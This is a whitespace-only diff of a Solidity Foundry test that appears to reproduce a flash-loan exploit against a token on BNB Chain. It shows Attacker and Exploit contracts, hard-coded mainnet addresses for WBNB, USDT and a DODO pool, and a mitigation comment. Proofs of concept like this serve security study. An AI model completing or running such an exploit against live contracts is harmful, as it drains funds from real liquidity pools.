@@ -28,6 +28,7 @@ import "./../interface.sol";
 // Potential mitigations: Implements sync() function in _transfer()
 
 contract Attacker is Test {
+
     WBNB constant wbnb = WBNB(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
     Exploit immutable exploit;
 
@@ -41,9 +42,11 @@ contract Attacker is Test {
         exploit.go();
         emit log_named_decimal_uint("[After Attacks] Attacker WBNB balance", wbnb.balanceOf(address(this)), 18);
     }
+
 }
 
 contract Exploit is Test {
+
     IDPPAdvanced constant dppAdvanced = IDPPAdvanced(0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4);
     WBNB constant wbnb = WBNB(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
     IUSDT constant usdt = IUSDT(0x55d398326f99059fF775485246999027B3197955);
@@ -120,10 +123,12 @@ contract Exploit is Test {
     }
 
     receive() external payable {}
+
 }
 
 /*---------- Interface ----------*/
 interface IDPPAdvanced {
+
     event DODOFlashLoan(address borrower, address assetTo, uint256 baseAmount, uint256 quoteAmount);
     event DODOSwap(
         address fromToken, address toToken, uint256 fromAmount, uint256 toAmount, address trader, address receiver
@@ -216,4 +221,5 @@ interface IDPPAdvanced {
     ) external returns (bool);
     function tunePrice(uint256 newI, uint256 minBaseReserve, uint256 minQuoteReserve) external returns (bool);
     function version() external pure returns (string memory);
+
 }
